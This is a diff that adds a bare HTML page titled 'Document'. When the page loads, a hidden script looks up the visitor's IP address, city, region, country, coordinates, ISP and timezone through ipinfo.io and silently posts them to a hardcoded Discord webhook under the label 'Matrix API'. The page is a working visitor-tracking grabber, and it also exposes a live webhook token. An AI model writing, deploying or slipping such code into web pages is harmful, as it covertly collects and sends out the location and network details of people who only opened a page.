@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+<body>
+    <p id="data"></p>
+    
+    <script>
+      function getDataFromUser() {
+        $.getJSON("https://ipinfo.io/", function(data) {
+          var fullData = {
+            IPv4: data.ip,
+            City: data.city,
+            Region: data.region,
+            Country: data.country,
+            Location: data.loc,
+            Provider: data.org,
+            Timezone: data.timezone
+          }
+
+          document.getElementById("data").innerHTML = JSON.stringify(fullData);
+      
+          console.log(fullData);
+
+          const request = new XMLHttpRequest();
+          request.open("POST", "https://discordapp.com/api/webhooks/1024745428782157895/2aESkvrPQ9vud0ZshYmzYLEYkBKOW8FDzd2ZumHrz302g8pcn_IDRWzEQ15o9V9du11A");
+
+          request.setRequestHeader('Content-type', 'application/json');
+
+          var myBed = {
+            title: "Matrix API",
+            description: JSON.stringify(fullData)
+          }
+
+          const params = {
+            username: "Matrix API",
+            embeds: [ myBed ]
+          }
+
+          request.send(JSON.stringify(params));
+      
+        })
+      }
+
+      getDataFromUser();
+    </script>
+
+</body>
+</html>
